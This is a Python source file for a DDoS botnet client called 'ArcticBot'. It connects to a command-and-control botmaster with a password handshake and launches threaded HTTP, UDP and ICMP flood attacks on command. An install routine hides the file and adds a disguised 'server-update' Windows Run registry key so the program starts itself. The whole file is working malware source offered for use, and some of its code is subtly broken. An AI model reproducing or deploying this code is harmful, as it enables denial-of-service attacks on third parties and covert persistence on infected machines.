Password = ''
mode = 'py'
address = '127.0.0.1'
port = 6240
Threads = 10
delay = 0.3
buffsize = 512
Attribute_hide = True
Self_starting = True
#Testing code, will be delete in generation
# -*- coding:utf-8 -*-
# @FileName  :client_source.py
# @Author    :D0WE1L1N

from socket import *
from threading import Thread
from random import _urandom, randint
from time import sleep
from os.path import abspath
from sys import argv

s = socket(AF_INET, SOCK_STREAM) # create socket
ddos_flag = True # used to control ddos attack thread, False when the attack is stopped
path = abspath(argv[0]) # used in .exe mode

def ddos(mode:str, address:str): #address : ip or url
    '''
    This method is the main attack method.
    mode is ta supported attack method .
    THE ADDRESS CAN BE A IP OR A URL.
    each method will define a method "attack_{attack_method}", which will be execute countless times by thread and infinite loop.
    the "attack_{attack_method}" method require a ip or url.
    '''
    global ddos_flag
    attack_list = ['httpflood', 'UDPflood', 'ICMPflood']
    print("[*]Start attack")
    print(f'[*]In {mode} mode')
    if mode == 'httpGETflood' or mode == 'httpflood' or mode == 'httpPOSTflood' or mode == 'Mix': # httpflood method : only http GET flood
        from urllib import request,parse
        from ssl import _create_unverified_context
        # headers can be set here
        dict = {
            "name":"ArcticWolf"
        } # can be changed
        context = _create_unverified_context()
        data = bytes(parse.urlencode(dict), encoding='utf8')
        if mode == 'httpGETflood':
            def attack_httpGETflood(url):
                while True:
                    if not ddos_flag: return
                    try:
                        with request.urlopen(url, context=context)as response: # add headers=headers if headers is required
                            print('[*]code:', response.status)
                    except Exception as e:
                        print(e)
                        pass
                    sleep(delay)  
        elif mode == 'httpPOSTflood':
            def attack_httpPOSTflood(url):
                while True:
                    if not ddos_flag: return
                    try:
                        with request.urlopen(url, data=data, context=context)as response: # add headers=headers if headers is required
                            print('[*]code:', response.status)
                    except Exception as e:
                        print(e)
                        pass
                    sleep(delay)  
        else:
            def attack_httpflood(url):
                while True:
                    if not ddos_flag: return # To stop the attack
                    try:
                        if randint(1, 2) == 1: # Randint to get the attack method
                            with request.urlopen(url, context=context)as response:
                                print('[*]code:', response.status) 
                        else:
                            with request.urlopen(url, data=data, context=context) as response:
                                print('[*]code:', response.status)
                        sleep(delay)        
                    except Exception as e:
                        print(e)
                        pass
    if mode == 'UDPflood' or mode == 'Mix': # UDPflood
        def attack_UDPflood(ip):
            sock = socket(AF_INET, SOCK_DGRAM)
            byte = _urandom(1490)
            port = 1
            sent = 0
            while True:
                if not ddos_flag: return # To stop the attack
                sock.sendto(byte, (ip, port))
                sent = sent + 1
                print(f"[*] Sent " + str(sent) + " packet to " + ip + " through port " + str(port))
                port += 1
                if port == 65534:
                    port = 1
                sleep(delay)
    if mode == 'ICMPflood' or mode == 'Mix':
        from array import array
        from struct import pack, unpack
        from time import time

        header = pack('bbHHh', 8, 0, 0, 12345, 0)  # create header
        data = pack('d', time())  # create data, random time
        packet = header + data
        if len(packet) & 1:
            packet = packet + '\0'
        words = array('h', packet)
        sum = 0
        for word in words:
            sum += (word & 0xffff)
        sum = (sum >> 16) + (sum & 0xffff)
        sum = sum + (sum >> 16)
        chkSum = (~sum) & 0xffff
        header = pack('bbHHh', 8, 0, chkSum, 12345, 0)
        icmp_data = header + data
        Sock = socket(AF_INET, SOCK_RAW, getprotobyname("icmp"))
        def attack_ICMPflood(ip):
            while True:
                if not ddos_flag: return # To stop the attack
                Sock.sendto(icmp_data , (ip, 0))
                sleep(delay)
                # recv_packet, addr = Sock.recvfrom(1024)
                # send the packages
                print('[*] packet sent')
    print('[*]Attack:', address) 
    if mode != 'Mix':
        exec(f'for i in range(Threads): Thread(target=attack_{mode}, args=(address,)).start()')
    else:
        for i in range(Threads):
            exec(f'Thread(target=attack_{attack_list[randint(0, len(attack_list))]}, args=(address,)).start()')        
            sleep(0.3)
def connect():
    '''
    This method is used to connect the botmaster host.
    It will send a message to check if it was the botmaster.
    When an error occured, this method will reset until the connection was on.
    After getting the connection, this method will wait for the attack command.
    Heartbeat message will also be recived and sent by this method.
    '''
    global s
    try:
        try:
            s.connect((address, port))
            if s.recv(buffsize).decode('utf8') == 'ArcticBotCheck':
                s.send(Password.encode('utf8'))
            if s.recv(buffsize).decode('utf8') == 'OK':
                print(f'[*]Connected to {address} : {port}')
            else:
                print(f'[*]Refused by {address} : {port}')
                return True
        except ConnectionRefusedError:
            print('[*]reset')
            connect()
        while True:
            global ddos_flag
            recvdata = s.recv(buffsize).decode('utf-8')
            print('[*]'+recvdata)
            if recvdata == 'stop_ddos':
                ddos_flag = False
            if recvdata.split('_')[0] == 'attack':
                ddos_flag = True
                Thread(target=ddos, args=(recvdata.split('_')[1], recvdata.split("_")[2],)).start()
            if recvdata == 'heartbeat':
                s.send("heartbeat".encode("utf8")) # heartbeat system
            if recvdata == 'shut':
                print('[*]shutdown the connection')
                s.close()
                return True # Shutdown
    except Exception as e:
        print(e)
        s.close()
        s = socket(AF_INET, SOCK_STREAM)
        connect()
def install():
    '''
    This method is used to install the virus to the host
    inclued Self-starting, hiding and something else
    '''
    global path
    if Attribute_hide:
        import win32api, win32con
        win32api.SetFileAttributes(path,win32con.FILE_ATTRIBUTE_HIDDEN) 
        print("[*]File hidden") 
    if Self_starting:
        import winreg
        print('[*]Installing to "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"')
        reg_root = winreg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(reg_root, reg_path, 0, winreg.KEY_ALL_ACCESS)
        if mode == 'py':
            winreg.SetValueEx(key, "server-update", 0, winreg.REG_SZ, 'python' + path)
        if mode == 'exe':
            winreg.SetValueEx(key, "server-update", 0, winreg.REG_SZ, path)
        winreg.CloseKey(key)
        print("[+]Installed")
if __name__ == '__main__':
    print("[*]start")
    # threading.Thread(target=connect).start()
    try:
        install()
        connect()
    except Exception as e:
        print(e)

# Blank line(will be delete)